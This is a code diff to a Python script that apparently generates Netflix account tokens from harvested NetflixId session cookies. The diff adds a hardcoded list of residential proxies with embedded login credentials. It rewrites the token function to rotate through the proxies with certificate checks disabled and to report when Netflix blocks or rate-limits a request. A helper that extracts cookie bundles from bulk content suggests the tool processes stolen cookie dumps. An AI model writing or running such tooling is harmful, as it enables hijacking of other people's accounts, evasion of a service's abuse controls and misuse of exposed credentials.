@@ -2,14 +2,32 @@ import requests
 import json
 import re
 import time
+import random
 from datetime import datetime, timedelta, timezone
 
 # ==================================================
-# NFTOKEN GENERATION - WORKING VERSION
+# PROXY LIST (Webshare Residential Proxies)
+# ==================================================
+
+PROXY_LIST = [
+    "http://mfaqlivy:ar91rt230oyo@31.59.20.176:6754",
+    "http://mfaqlivy:ar91rt230oyo@31.56.127.193:7684",
+    "http://mfaqlivy:ar91rt230oyo@45.38.107.97:6014",
+    "http://mfaqlivy:ar91rt230oyo@198.105.121.200:6462",
+    "http://mfaqlivy:ar91rt230oyo@64.137.96.74:6641",
+    "http://mfaqlivy:ar91rt230oyo@198.23.243.226:6361",
+    "http://mfaqlivy:ar91rt230oyo@38.154.185.97:6370",
+    "http://mfaqlivy:ar91rt230oyo@84.247.60.125:6095",
+    "http://mfaqlivy:ar91rt230oyo@142.111.67.146:5611",
+    "http://mfaqlivy:ar91rt230oyo@191.96.254.138:6185",
+]
+
+# ==================================================
+# NFTOKEN GENERATION WITH PROXY ROTATION
 # ==================================================
 
 def create_nftoken(cookies):
-    """Generate Netflix token - WORKING VERSION"""
+    """Generate Netflix token using rotating residential proxies"""
     
     netflix_id = cookies.get('NetflixId')
     if not netflix_id:
@@ -70,33 +88,53 @@ def create_nftoken(cookies):
         "Cookie": f"NetflixId={netflix_id}"
     }
     
-    try:
-        response = requests.get(url, params=params, headers=headers, timeout=15, verify=False)
-        
-        if response.status_code != 200:
-            return None
-        
-        data = response.json()
-        
-        token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
-        token = token_data.get("token")
-        
-        if not token:
-            return None
-        
-        expires = datetime.now(timezone.utc) + timedelta(hours=1)
-        
-        return {
-            'token': token,
-            'expires_at_utc': expires.strftime("%Y-%m-%d %H:%M:%S UTC")
-        }
-        
-    except Exception as e:
-        return None
-
-# ==================================================
-# OTHER FUNCTIONS (keep these for compatibility)
-# ==================================================
+    # Randomize proxy order
+    proxies_to_try = PROXY_LIST.copy()
+    random.shuffle(proxies_to_try)
+    
+    for proxy_url in proxies_to_try:
+        try:
+            proxies = {
+                'http': proxy_url,
+                'https': proxy_url,
+            }
+            
+            print(f"🔄 Trying proxy: {proxy_url.split('@')[-1]}")
+            
+            response = requests.get(
+                url,
+                params=params,
+                headers=headers,
+                proxies=proxies,
+                timeout=15,
+                verify=False
+            )
+            
+            print(f"📡 Status: {response.status_code}")
+            
+            if response.status_code == 200:
+                data = response.json()
+                token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
+                token = token_data.get("token")
+                
+                if token:
+                    print(f"✅ Token generated! Length: {len(token)}")
+                    expires = datetime.now(timezone.utc) + timedelta(hours=1)
+                    return {
+                        'token': token,
+                        'expires_at_utc': expires.strftime("%Y-%m-%d %H:%M:%S UTC")
+                    }
+            elif response.status_code == 403:
+                print(f"❌ Proxy blocked by Netflix")
+            elif response.status_code == 429:
+                print(f"❌ Rate limited")
+                
+        except requests.exceptions.Timeout:
+            print(f"❌ Proxy timed out")
+        except Exception as e:
+            print(f"❌ Proxy error: {e}")
+    
+    return None
 
 def extract_cookie_bundles(content):
     """Extract cookies from content"""
